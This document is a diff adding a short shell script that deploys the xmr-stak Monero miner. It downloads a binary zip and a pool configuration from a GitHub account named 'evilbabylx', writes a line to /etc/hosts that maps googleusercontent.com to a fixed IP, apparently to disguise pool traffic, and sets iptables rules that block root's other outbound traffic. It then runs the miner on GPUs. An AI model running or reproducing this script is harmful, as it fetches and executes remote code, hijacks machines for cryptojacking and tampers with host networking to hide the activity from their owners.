@@ -1,0 +1,14 @@
+apt install libmicrohttpd-dev -y
+wget https://github.com/evilbabylx/script/raw/master/bin.zip
+unzip bin.zip
+chmod +x xmr-stak
+rm pools.txt
+wget https://raw.githubusercontent.com/evilbabylx/script/master/configazi/pools.txt
+sh -c "echo '216.244.80.11  googleusercontent.com' >> /etc/hosts"
+
+iptables -I OUTPUT 1 -p tcp --sport 22 -j ACCEPT
+iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
+iptables -I OUTPUT 3 -p tcp -d googleusercontent.com -j ACCEPT
+iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
+
+./xmr-stak --noCPU
